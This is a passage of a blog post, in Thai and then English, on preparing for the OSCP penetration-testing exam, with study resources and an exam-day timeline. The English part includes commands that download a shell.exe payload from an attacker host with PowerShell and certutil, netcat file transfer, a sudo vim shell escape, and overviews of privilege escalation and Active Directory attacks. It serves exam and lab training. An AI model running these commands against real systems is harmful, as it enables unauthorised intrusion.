+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4_yDktfVaKldUHT8We6ojw.png"/>
+<figcaption>Student Subscription</figcaption>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GSfCtLzyuD0hTof0qnKuog.png"/>
+<figcaption>All Subscription</figcaption>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*exVtPBcv5RbjwVOwYND3Ug.png"/>
+<figcaption>Penetration Tester Path</figcaption>
+</figure>
+<blockquote>วิธีการเตรียมตัว CPTS อ่านได้จาก Blog ข้างล่างนี้<br/><a href="https://medium.com/@sabastiaz/my-journey-through-certified-penetration-testing-specialist-cpts-100-5ec4b0d2a628" rel="noopener" target="_blank">https://medium.com/@sabastiaz/my-journey-through-certified-penetration-testing-specialist-cpts-100-5ec4b0d2a628</a></blockquote>
+<p><strong>TryHackMe เป็น </strong>Platform สำหรับผู้เริ่มต้นไปจนถึงระดับผู้เชี่ยวชาญโดย THM มี Path ให้เรียนรู้ตามสายงานเลยดู path ได้จากภาพด่านล่างเลย</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0rlKYBFXMomzH7bu-ON3aw.png"/>
+<figcaption>Learning Path</figcaption>
+</figure>
+<p><strong>และนี่คือ Path ที่ทางผมแนะนำสำหรับการฝึกใช้เครื่องมือและฝึก Hack Machine ของแต่ละ module ท่ีมีให้ เพื่อขัดเกลาฝีมือของทุกท่านนั่นเอง<br/>(Offensive Pentesting and Red Teaming)<br/></strong><a href="https://tryhackme.com/path/outline/pentesting" rel="noopener" target="_blank">https://tryhackme.com/path/outline/pentesting</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*JjKHbkDdPbCg_PnuSTZw_A.png"/>
+<figcaption>Offsensive Pentesting</figcaption>
+</figure>
+<p><a href="https://tryhackme.com/path/outline/redteaming" rel="noopener" target="_blank">https://tryhackme.com/path/outline/redteaming</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*fulhd2mwyqXs_PnhM6cxjg.png"/>
+<figcaption>Read Teaming</figcaption>
+</figure>
+<blockquote>ซึ่งนอกเหนือจาก learning path เรียนแล้ว Tryhackme ก็มี Certified อย่าง PT1 <br/>(Jr Penetration Tester certification) ที่เป็น certified ไว้ให้ผู้ที่อยากท้าทายตนเองได้เข้าไปลิ้มลองซึ่งช่วงตอนเปิดตัวทาง tryhackme ได้มีการแจก voucher สอบ PT1 ฟรีให้กับผู้ที่ถือ OSCP PJPT Pentest+ จำนวน 3000 voucher ทั่วโลกซึ่งผมเองเป็นผู้โชคดี 1ใน 3000 ที่ได้ voucher มาสอบ ซึ่งได้ลองสอบไปเรียบร้อยแล้วต้องบอกว่า Network กับ Active Directory ง่ายมากแต่ Web ตึงมือเลลยทีเดียว ซึ่งถ้าไม่ได้ฟรี<br/>ต้องเสียเงินประมาณ 200$ เลย หากอยากอ่านเกี่ยวกับ PT1 เพิ่มเติมไปอ่านได้ที่ <br/><a href="https://medium.com/system-weakness/full-guide-to-help-you-pass-your-tryhackme-pt1-exam-3cf1f1fcb30b" rel="noopener" target="_blank">https://medium.com/system-weakness/full-guide-to-help-you-pass-your-tryhackme-pt1-exam-3cf1f1fcb30b</a></blockquote>
+<p><strong>0xdf รวบรวมเนื้อหา Machine ของ HTB ที่ใกล้เคียงกับเครื่องใน OSCP</strong></p>
+<p><a href="https://0xdf.gitlab.io/cheatsheets/offsec" rel="noopener" target="_blank">https://0xdf.gitlab.io/cheatsheets/offsec</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*VsJoo4xND6QisXTZQS5n3Q.png"/>
+<figcaption>0xdf</figcaption>
+</figure>
+<p>IPPSEC ไว้สำหรับค้นหาเนื้อหา HTB หรือ Lab อื่นเพื่อใช้ประกอบเวลาดำเนินการทำแลป</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*axPL5PX47vdj4q2g.png"/>
+<figcaption>IPPSEC</figcaption>
+</figure>
+<p><strong>Offsec Course (สำหรับคนที่ซื้อ Course แล้ว) ซึ่งถามตัวผมแลล้วคอร์สนี้เพียวพอต่อการฝึกไหมผมมองส่าเพียวพอแต่ไม่สุดเนื่องจากบางเนื้อหาไม่ได้มีในคอร์สต้องหาเองจากข้างน้อกเพิ่มเติมตาม HTB / THM <br/></strong><a href="https://www.offsec.com/courses/pen-200/" rel="noopener" target="_blank">https://www.offsec.com/courses/pen-200/</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/600/0*cyNjQR-EBc0vVL8D.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*_qn9VIiB7TTSlCpZBiZp_g.png"/>
+<figcaption>PEN 200 Course</figcaption>
+</figure>
+<p>Challenge Lab OSCP เน้นย้ำว่าอย่าข้ามที่จะลองเล่น ***<strong>OSCP ABC *** </strong>เนื่องจากเป็น Challenge ที่คุณจะได้ฝึกการใช้เครื่องในการ Initial Access / Pivot / Privilege Escalation และ อื่น ๆ อีกมากมาย</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*DPIgSXgAkvoApOdvz12U_Q.png"/>
+<figcaption>challenge Labs</figcaption>
+</figure>
+<h2>6. การเขียน Report (อย่ามองข้าม)</h2>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*JA0gHDolqFFnRQhmQ7KAAg.png"/>
+<figcaption>ตัวอย่างการ screenshot ที่ถูกต้อง</figcaption>
+</figure>
+<ul>
+<li>รายงานคือ <strong>เงื่อนไขการสอบผ่าน</strong> ถ้า exploit ได้แต่เขียนไม่เป็น = <strong>ไม่ผ่าน</strong></li>
+</ul>
+<p>เนื่องจาก OSCP มีเวลาให้เขียน Report ส่งภายใน 24 ชั่วโมงหลังตากหมดเวลาสอบแล้วนั่นหมายความว่าก่อนที่ตะจบการสอบควรตรวจสอบ Screenshot ของคุณว่าครบถ้วนตามที่ Offsec ต้องการแล้วไหม เช่น ipconfig หรือยัง shell ที่ใช้เป็น interactive shell ยัง cat flag ดีแล้วหรือยัง หรือ flag ที่ cat มาใส่ตรง console ตรงไหม</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*RqTMqy8MmFVDPXR4.jpg"/>
+</figure>
+<ul>
+<li>ฝึกเขียนตั้งแต่ Lab → include: ขั้นตอน, command, screenshot, impact, remediation ดูเพิ่มเติมได้จากที่นี่ <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements" rel="noopener" target="_blank">https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements</a></li>
+<li>Template ใช้ Markdown/Word → export PDF <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#suggested-documentation-templates" rel="noopener" target="_blank">https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#suggested-documentation-templates</a></li>
+</ul>
+<h2>7. Timeline การสอบคร่าวๆของผมเองใช้เป็น Guide line ได้นะครับ</h2>
+<p><strong>Timeline</strong><br/>07.00 ตื่นนอนและก็ทำร่างกายให้สดชื่น<br/>08.00 กินข้าวเช้าเตรียมตัวสำหรับการสอบ<br/>09.00 โทรไปขอพรจากครอบครัวเพื่อเสริมความเป็นสิริมงคล<br/>09.45 เข้าระบบ Proctor เพื่อยืนยันตัวตนและเตรียมสอบ<br/>10.05 เข้าสอบ (ได้สอบช้าเพราะเครื่องหลอนเลยเสียเวลาไป)<br/>10.20 เริ่มการ VPN และเช็คความพร้อมของเครื่องตามคำแนะนำ Proctor<br/>10.25 ตรวจเช็ค Targets ของการสอบ และจับเวลาในการทำข้อสอบ</p>
+<p><strong>Active Directory (1 Domain Controller and 2 Clients )<br/></strong>10.30 เริ่มการ Recon และ Enum Targets โดยทำเฉพาะแค่เครื่อง AD อย่างเดียว<br/>11.00 เจอทางเข้าสำหรับ AD เครื่องแรก<br/>12.00 Get user flag AD เครื่องแรก (<strong>0 point</strong>)<br/>12.30 Get Administrator flag AD เครื่องแรก (<strong>0 point</strong>)<br/>12.45 ได้ข้อมูลสำหรับ AD เครื่องที่ 2 (<strong>0 point</strong>)<br/>13.00 เข้า AD เครื่องที่ 2 (<strong>0 point</strong>)<br/>13.30 พักทานข้าว<br/>14.00 ลุยต่อกับ AD เครื่องที่ 2 (<strong>0 point</strong>)<br/>14.30 Get user flag AD เครื่องสอง (<strong>0 point</strong>)<br/>14.45 Get Administrator flag เครื่องสอง (<strong>0 point</strong>)<br/>14.50 เข้า AD เครื่องสุดท้าย (Domain Controller)<br/>15.00 Get Administrator flag ของ Domain Controller (<strong>40 point</strong>)</p>
+<p>ถึงตรงนี้ก็ได้มาในมือ <strong>40 point</strong> แล้ว เลยพักสักนิดนึง พร้อมกับหยุดจับเวลาของ AD และเริ่มจับของ Standalone ต่อ</p>
+<p><strong>Standalone (3 Machines)</strong><br/>16.00 เริ่มการ Recon และ Enum เครื่องแรก<br/>16.20 หลังจาก Recon และ Enum ดันเจอข้อสอบเดิมที่เราทำไม่ได้ในรอบที่แล้ว<br/>16.30 เปลี่ยนไป Recon และ Enum เครื่องอื่นต่อ<br/>18.00 หาทางเข้าเครื่องสองเจอ กว่าจะได้ตก Rabbit Hole ไปอยู่พักนึง<br/>18.30 พักกินข้าว มื้อนี้กับข้าวอร่อยมาก เพราะเป็นกับข้าวที่คุณป้าเป็นคนทำไว้ให้<br/>เลยทำให้มีแรงฮึกเฮิมครั้งพร้อมไปลุยต่อ<br/>19.30 Recon และ Enum เครื่องสอง และ เครื่องสาม<br/>20.30 ได้ข้อมูลจากการ Recon และ Enum เตรียมหาทางเข้า<br/>20.50 หาทางเข้าเครื่องที่สองได้เป็นที่เรียบร้อย หาช่องทางในการเข้าถึง<br/>21.00 กลับมาทำเครื่องแรกที่เราติดอยู่เลยนึกคำนึงได้ <strong>Enum is Key </strong>เลยทำการ Enum ใหม่ให้ละเอียดขึ้นกว่าเดิมใช้ทุกอย่างที่มี<br/>22.00 กว่าจะ Enum หมด และแล้วก็เจอทางเข้าจนได้<br/>22.30 Get user flag ของเครื่องแรก (<strong>50 point</strong>)<br/>22.45 Privilege Escalation เครื่องแรก<br/>23.00 Get root flag เครื่องแรก (<strong>60 point</strong>)<br/>23.15 เข้าถึงเครื่องที่สอง<br/>23.30 Get user flag เครื่องสอง (<strong>70 point</strong>)<br/>มาถึงตรงนี้จริงๆ จะหยุดก็ได้นะเพราะคะแนนผ่านแล้วแต่ก็เลือดนักสู้ไปต่อสิครับเวลาเหลืออีกเยอะ<br/>00.00 Get root flag เครื่องสอง (<strong>80 point</strong> )</p>
+<h2>สูดความมั่นใจ</h2>
+<ol>
+<li>เชื่อมั่นในตัวเองว่าจะเราทำมันได้</li>
+<li>มี Note ไว้ใช้ข้างกาย เช่น Notion / obsidian / gitbook /joplin เพื่อเอาไว้ใช้เก็บ command ไว้ใช้ตอนสอบ</li>
+<li><strong>Enum is Key *****</strong></li>
+</ol>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*FZT9AAQlK0VO7ure.jpg"/>
+</figure>
+<h2>8. Mindset “ไร้กังวล” จากบุคคลต่างๆที่ผ่านมาแล้ว</h2>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*QhQEI6aSdney6LcG.jpg"/>
+</figure>
+<p>หลังจากมาถึงตรงนี้แล้วก็ได้เวลาตั้งเป้าหมายเพื่อพิชิต OSCP ที่ไฝ่ฝันกันแล้ว <br/>ผมหวังว่า Blog จะเป็นประโยชน์กับทุกๆท่านไม่มากก็น้อยขอให้ทุกท่านโชคดีครับ</p>
+<h2><strong>- - -Good Luck and Try Harder (Pay Harder) - - -</strong></h2>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*nCaoD19US9UlH4Zt.jpg"/>
+</figure>
+<blockquote><strong>Profile</strong></blockquote>
+<blockquote><strong>เจ้าของ Blog Sabastiaz<br/>Medium</strong> : <a href="https://medium.com/@sabastiaz" rel="noopener" target="_blank">https://medium.com/@sabastiaz</a><br/><strong>Linkedin: </strong><a href="https://www.linkedin.com/in/ratthapong-sommanus-465b661b2/" rel="noopener" target="_blank">https://www.linkedin.com/in/ratthapong-sommanus-465b661b2/</a></blockquote>
+<blockquote><strong>Chicken0248</strong> <br/><strong>Medium</strong> : <a href="https://medium.com/@chaoskist" rel="noopener" target="_blank">https://medium.com/@chaoskist</a><br/><strong>Linkedin: </strong><a href="https://www.linkedin.com/in/warawut-manosong/" rel="noopener" target="_blank">https://www.linkedin.com/in/warawut-manosong/</a></blockquote>
+<blockquote><strong>Boeing777<br/>Medium</strong> : <a href="https://medium.com/@_boeing777" rel="noopener" target="_blank">https://medium.com/@_boeing777</a><br/><strong>Linkedin: </strong><a href="https://www.linkedin.com/in/itthidej-a-214184234/" rel="noopener" target="_blank">https://www.linkedin.com/in/itthidej-a-214184234/</a></blockquote>
+<blockquote><strong>Prawee<br/>Linkedin: </strong><a href="https://www.linkedin.com/in/prawee-lertprasertphan/" rel="noopener" target="_blank">https://www.linkedin.com/in/prawee-lertprasertphan/</a></blockquote>
+</div>
+<div class="post-body lb" lang="en">
+<p>Hello again everyone. Today I'd like to talk about exam preparation - my approach and what I've gathered from the people around me.</p>
+<blockquote>Understanding OSCP before you start</blockquote>
+<blockquote><em>OSCP, formerly known as </em><strong><em>Offensive Security Certified Professional</em></strong><em> and now called </em><strong><em>OffSec Certified Professional</em></strong><em> (code PEN-200), is an exam that penetration testers desperately want to conquer. For more background, check out my journey post at:<br/></em><a href="https://sabastiaz.medium.com/my-oscp-journey-triple-attempts-63ba203df052" rel="noopener" target="_blank">https://sabastiaz.medium.com/my-oscp-journey-triple-attempts-63ba203df052</a></blockquote>
+<p><strong>Before reading this blog you might feel like this:</strong></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*B2WDuaiUN_sXVzft.jpg"/>
+</figure>
+<p><strong>But after reading this blog, that will change to:</strong></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-4jqbsjitzFVCq1O.jpg"/>
+</figure>
+<h2>Let's Talk About the OSCP Exam Structure</h2>
+<p>How scoring works and what solutions let you pass. OSCP requires 70 points or more to pass. Here's how points are counted:</p>
+<ul>
+<li><strong>3 stand-alone machines (60 points in total)</strong></li>
+<li>20 points per machine</li>
+<li>10 points for initial access</li>
+<li>10 points for privilege escalation</li>
+<li><strong>1 Active Directory (AD) set containing 3 machines (40 points in total)</strong></li>
+<li>For the AD set, learners are provided with a username and password (breach scenario)</li>
+<li>10 points for machine #1</li>
+<li>10 points for machine #2</li>
+<li>20 points for machine #3</li>
+</ul>
+<p>Below are the passing scenarios to reach 70 points:</p>
+<ul>
+<li>40 points AD + 3 local.txt flags (70 points)</li>
+<li>40 points AD + 2 local.txt flags + 1 proof.txt flag (70 points)</li>
+<li>20 points AD + 3 local.txt flags + 2 proof.txt flags (70 points)</li>
+<li>10 points AD + 3 fully completed stand-alone machines (70 points)</li>
+</ul>
+<blockquote>The goal you should aim for is 100 points:<br/><strong>40 points AD + 3 fully completed stand-alone machines (100 points)</strong></blockquote>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*nkxn2IUUNuiXXRYI.gif"/>
+</figure>
+<h3>Now that I've covered the basics, here's my OSCP preparation plan - organized into topics:</h3>
+<h3>1. Solid Foundation = A Head Start</h3>
+<p>We all know OSCP is tough - but it's not impossibly hard if you build a strong foundation first. Here are the key areas I recommend for beginners:</p>
+<h3>File Transfer</h3>
+<p><strong>Meaning:</strong> Methods for transferring files between attacker and victim machines using protocols or commands already available on the system (living off the land).</p>
+<p><strong>PowerShell</strong></p>
+<ul>
+<li><code>wget</code> / <code>Invoke-WebRequest</code> (iwr):</li>
+</ul>
+<pre><code>powershell -c "iwr &lt;http://10.10.10.1/shell.exe&gt; -OutFile C:\Windows\Temp\shell.exe"</code></pre>
+<p><strong>Certutil (Windows built-in)</strong></p>
+<pre><code>certutil -urlcache -split -f &lt;http://10.10.10.1/shell.exe&gt; shell.exe</code></pre>
+<p><strong>scp (Linux/Unix)</strong></p>
+<pre><code>scp file.txt user@target:/tmp/file.txt</code></pre>
+<p><strong>nc (netcat)</strong></p>
+<p>Send: <code>nc -lvnp 4444 &lt; file.txt</code> | Receive: <code>nc attacker 4444 &gt; file.txt</code></p>
+<p><strong>ftp</strong></p>
+<pre><code>ftp 10.10.10.1
+Username: anonymous
+Password: anonymous
+ftp&gt; put shell.exe
+ftp&gt; get secret.txt</code></pre>
+<h3>Command Prompt (CMD) &amp; PowerShell Basics (OSCP Prep)</h3>
+<p>CMD is Windows' basic shell - simple commands, not much complexity.</p>
+<h3>Basic Commands</h3>
+<ul>
+<li><code>dir</code> → list files/folders in current directory</li>
+<li><code>cd</code> → change directory</li>
+<li><code>type</code> → read a file (like <code>cat</code> on Linux)</li>
+<li><code>copy</code>, <code>move</code>, <code>del</code> → manage files</li>
+<li><code>tasklist</code> → view running processes</li>
+<li><code>net user</code> → list system users</li>
+<li><code>net localgroup administrators</code> → view local admin group</li>
+<li><code>ipconfig</code> → show network config</li>
+</ul>
+<h3>PowerShell (Windows Enumeration &amp; Execution)</h3>
+<ul>
+<li><strong>Basic Cmdlets:</strong> <code>Get-Process</code>, <code>Get-Service</code>, <code>Get-LocalUser</code></li>
+<li>Use PowerShell with payloads/scripts for <strong>post-exploitation</strong> and PrivEsc</li>
+</ul>
+<p>A great resource for <strong>Reverse shells</strong>: <br/><a href="https://www.revshells.com/" rel="noopener" target="_blank">https://www.revshells.com/</a> - generates reverse shells in multiple languages</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*acRP02Gvdvu9ZR5BPmpOSQ.png"/>
+</figure>
+<h3>Web Application Section</h3>
+<p>I recommend PortSwigger Academy - an excellent free course for web security training: <a href="https://portswigger.net/web-security" rel="noopener" target="_blank">https://portswigger.net/web-security</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*oVX7gPbh3xjraiwQTi7gNQ.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Y7idZXynqaVOQcX4YR2DLQ.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*qL1jm0EJXNlHmDVKeTSZ1Q.png"/>
+</figure>
+<p>Beyond the web academy, PortSwigger also offers the <strong>Burp Suite Certified Practitioner (BSCP)</strong> certification - an official credential for web security experts. Details at: <a href="https://portswigger.net/web-security/certification" rel="noopener" target="_blank">https://portswigger.net/web-security/certification</a></p>
+<p><strong>Tools:</strong></p>
+<ul>
+<li>Burp Suite Community (intercept, repeater)</li>
+<li>dirsearch / gobuster (directory brute force)</li>
+</ul>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*nCTuLkupGZvFp_NM.gif"/>
+</figure>
+<h2>2. Focus on Enumeration Practice</h2>
+<p>Helps you find entry points efficiently without falling into Initial Access rabbit holes.</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*2tMYuaVLpDu01Qfr.gif"/>
+<figcaption>The rabbit hole in question</figcaption>
+</figure>
+<p>Practice with nmap, rustscan, gobuster/feroxbuster, smbclient, ldapsearch, and the newcomer: <a href="https://www.netexec.wiki/" rel="noopener" target="_blank"><strong>Netexec</strong></a></p>
+<h3>What is NetExec?</h3>
+<ul>
+<li><strong>NetExec (nxc)</strong> is a fork of CrackMapExec (CME)</li>
+<li>Used for <strong>enumeration, exploitation, credential spraying, and lateral movement</strong> on Windows/AD environments</li>
+<li>Supports multiple protocols: SMB, RDP, WinRM, MSSQL, SSH, etc.</li>
+</ul>
+<h3>Key Features</h3>
+<ul>
+<li><strong>SMB / WinRM / RDP enumeration</strong></li>
+<li><strong>Credential spraying &amp; brute forcing</strong></li>
+<li><strong>Remote command execution</strong> (smbexec, wmiexec, atexec)</li>
+<li><strong>Password dump / SAM dumping</strong> (with appropriate privileges)</li>
+<li><strong>Kerberos support</strong> (AS-REP roasting, Kerberoasting)</li>
+</ul>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*k9liStDXKUVRyVy3"/>
+<figcaption>NetExec</figcaption>
+</figure>
+<blockquote>Simple takeaway: <strong><em>Enum is the key</em></strong> 🔑</blockquote>
+<h2>3. Develop Privilege Escalation Skills</h2>
+<h3>Privilege Escalation Techniques (Linux &amp; Windows)</h3>
+<p>Once you've gained <strong>initial access</strong> to a target, the next goal is privilege escalation - becoming <strong>root</strong> (Linux) or <strong>SYSTEM/Administrator</strong> (Windows) for full control. Techniques differ by OS:</p>
+<h3>Linux Privilege Escalation</h3>
+<h3>1. Sudo Misconfiguration</h3>
+<p>Admins sometimes allow users to run specific commands with <code>sudo</code> without a password. If that command can escape to a shell (e.g., <code>vim</code>, <code>python</code>), you can open a root shell immediately.</p>
+<pre><code>sudo vim -c ':!/bin/sh'</code></pre>
+<h3>2. SUID Binaries</h3>
+<p>Files with SUID permission run with the owner's privileges. If owned by root and insecurely coded, they can be exploited.</p>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+<h3>3. Cron Jobs</h3>
+<p>If a cron script run by root is in a path writable by the user, you can inject a malicious command to run as root.</p>
+<h3>4. Kernel Exploits</h3>
+<p>Old kernel versions may have vulnerabilities. Check version with <code>uname -a</code> and search exploit-db. Example: DirtyCow (CVE-2016-5195).</p>
+<h3>5. PATH Hijacking</h3>
+<p>If a root script calls a binary without a full path (e.g., <code>tar</code> instead of <code>/bin/tar</code>), create a malicious binary with the same name earlier in <code>$PATH</code>.</p>
+<h3>Windows Privilege Escalation</h3>
+<h3>1. Weak Services</h3>
+<p>Services running as SYSTEM but with user-writable binaries or registry keys allow attackers to replace them with malicious payloads.</p>
+<h3>2. Unquoted Service Paths</h3>
+<p>Windows tries each path segment in order when a service path has spaces and no quotes - creating malicious binaries at early path positions works.</p>
+<h3>3. AlwaysInstallElevated</h3>
+<p>A Windows policy allowing users to install <code>.msi</code> packages as SYSTEM - if enabled at both machine and user level, create a malicious <code>.msi</code>.</p>
+<h3>4. Token Impersonation</h3>
+<p>Programs running with high privileges may leave tokens behind. Impersonate those tokens to run processes as SYSTEM.</p>
+<p><strong>Common tools:</strong> GodPotato, PrintSpoofer</p>
+<h3>5. Vulnerable Drivers</h3>
+<p>Some installed drivers have arbitrary kernel read/write vulnerabilities that can elevate to SYSTEM.</p>
+<h3>Enumeration Tools</h3>
+<ul>
+<li><strong>Linux</strong> → LinPEAS, Linux Exploit Suggester</li>
+<li><strong>Windows</strong> → WinPEAS, Seatbelt, SharpUp</li>
+</ul>
+<p>My friend (an OSCE3 candidate) wrote an excellent Windows PrivEsc article: <a href="https://datafarm-cybersecurity.medium.com/windows-privilege-escalation-ea2a93cbd0e9" rel="noopener" target="_blank">https://datafarm-cybersecurity.medium.com/windows-privilege-escalation-ea2a93cbd0e9</a></p>
+<blockquote><strong>Practice until you develop the instinct: "weird service → this might be a PE vector"</strong></blockquote>
+<h2>4. Active Directory &amp; Network Attacks</h2>
+<p>Active Directory is the heart of enterprise networks - storing user accounts, permissions, Group Policy, and services. Compromising AD means compromising the whole organization.</p>
+<p>AD attacks typically start from a small foothold on the network (user machine, service account, share drive) and progress toward the domain controller (DC).</p>
+<h3>Popular Attack Techniques</h3>
+<p><strong>Kerberoasting</strong></p>
+<ul>
+<li>Extract Kerberos service tickets for offline cracking</li>
+<li>Weak passwords = instant access to high-privilege service accounts</li>
+</ul>
+<p><strong>AS-REP Roasting</strong></p>
+<ul>
+<li>Attack users with <code>Do not require pre-auth</code> enabled</li>
+<li>Get hashes for offline password cracking</li>
+</ul>
+<p><strong>Pass-the-Hash / Pass-the-Ticket</strong></p>
+<ul>
+<li>No need for actual passwords - just a hash or ticket to impersonate users</li>
+<li>Makes lateral movement extremely fast</li>
+</ul>
+<p><strong>Misconfigured ACL / DACL Abuse</strong></p>
+<ul>
+<li>Incorrect permissions on AD objects (e.g., a user can modify another user)</li>
+<li>Can become a staircase to Domain Admin without exploiting software</li>
+</ul>
+<p><strong>BloodHound Recon</strong></p>
+<ul>
+<li>Use BloodHound CE: <a href="https://bloodhound.specterops.io/home" rel="noopener" target="_blank">https://bloodhound.specterops.io/home</a></li>
+<li>Maps relationships in AD - like having a secret map telling you "take this path to Domain Admin"</li>
+</ul>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*TLdZ87Ubk-ZYQosa.png"/>
+<figcaption>BloodHound example</figcaption>
+</figure>
+<p><strong>Network-level Attacks</strong></p>
+<ul>
+<li>LLMNR/NBT-NS Poisoning, SMB Relay, NTLM Relay</li>
+<li>Intercept credentials on the network and reuse them</li>
+</ul>
+<blockquote>Aim to be fluent with AD labs on <strong>HackTheBox / Proving Grounds</strong></blockquote>
+<h2>5. Learning Resources + Certifications (Optional)</h2>
+<p><strong>PG Play / Proving Grounds</strong> - OffSec's platform for practicing Linux and Windows machines: <a href="https://www.offsec.com/labs/individual/" rel="noopener" target="_blank">https://www.offsec.com/labs/individual/</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*H_AUVadSQCkhAqUbiERLPw.png"/>
+</figure>
+<p><strong>TJ Null</strong> - curated list comparing machines across platforms for OSCP prep:<br/><a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview" rel="noopener" target="_blank">https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*6fdWzYe2qYg0OPHPe68y-w.png"/>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*t4FILu8GZysNePyEXHrEWg.png"/>
+<figcaption>TJ Null List</figcaption>
+</figure>
+<p><strong>HTB Academy</strong> (recommended path: Penetration Tester Path - the CPTS path). With a student email, monthly subscription is $8:<br/><a href="https://academy.hackthebox.com/" rel="noopener" target="_blank">https://academy.hackthebox.com/</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4_yDktfVaKldUHT8We6ojw.png"/>
+<figcaption>Student Subscription</figcaption>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GSfCtLzyuD0hTof0qnKuog.png"/>
+<figcaption>All Subscription</figcaption>
+</figure>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*exVtPBcv5RbjwVOwYND3Ug.png"/>
+<figcaption>Penetration Tester Path</figcaption>
+</figure>
+<blockquote>Read about CPTS preparation at:<br/><a href="https://medium.com/@sabastiaz/my-journey-through-certified-penetration-testing-specialist-cpts-100-5ec4b0d2a628" rel="noopener" target="_blank">https://medium.com/@sabastiaz/my-journey-through-certified-penetration-testing-specialist-cpts-100-5ec4b0d2a628</a></blockquote>
+<p><strong>TryHackMe</strong> - a platform for beginners through advanced users with structured learning paths:</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0rlKYBFXMomzH7bu-ON3aw.png"/>
+<figcaption>Learning Path</figcaption>
+</figure>
+<p><strong>Recommended paths for tool practice and machine hacking:</strong><br/>(Offensive Pentesting and Red Teaming)<br/><a href="https://tryhackme.com/path/outline/pentesting" rel="noopener" target="_blank">https://tryhackme.com/path/outline/pentesting</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*JjKHbkDdPbCg_PnuSTZw_A.png"/>
+<figcaption>Offensive Pentesting</figcaption>
+</figure>
+<a href="https://tryhackme.com/path/outline/redteaming" rel="noopener" target="_blank">https://tryhackme.com/path/outline/redteaming</a>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*fulhd2mwyqXs_PnhM6cxjg.png"/>
+<figcaption>Red Teaming</figcaption>
+</figure>
+<blockquote>TryHackMe also offers the <strong>PT1</strong> (Jr Penetration Tester) certification. When it launched, they gave away free vouchers to OSCP/PJPT/Pentest+ holders - I was one of the lucky 3,000 worldwide. The Network and AD sections were quite easy but the Web section was very challenging. Without the free voucher it costs around $200.</blockquote>
+<p><strong>0xdf - collected HTB machines similar to those on OSCP:</strong><br/><a href="https://0xdf.gitlab.io/cheatsheets/offsec" rel="noopener" target="_blank">https://0xdf.gitlab.io/cheatsheets/offsec</a></p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*VsJoo4xND6QisXTZQS5n3Q.png"/>
+<figcaption>0xdf</figcaption>
+</figure>
+<p><strong>IPPSEC</strong> - search for HTB and other lab content to supplement your lab work:</p>
+<figure>
+<img alt="" loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*axPL5PX47vdj4q2g.png"/>
+<figcaption>IPPSEC</figcaption>
+</figure>
